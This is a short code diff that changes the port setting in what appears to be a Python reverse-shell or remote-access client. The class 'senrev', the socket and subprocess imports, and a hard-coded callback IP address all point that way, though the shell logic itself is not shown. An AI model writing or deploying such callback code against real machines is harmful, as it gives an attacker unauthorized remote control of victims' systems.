@@ -2,7 +2,7 @@
 import struct,socket,subprocess,os,platform,webbrowser as browser
 # server_config
 IP = "139.144.28.143" # Your server IP, default: localhost
-port = 4000  # #Your server Port, default: 4444
+port = 8000  # #Your server Port, default: 4444
 ################
 class senrev:
     def __init__(self,sock):
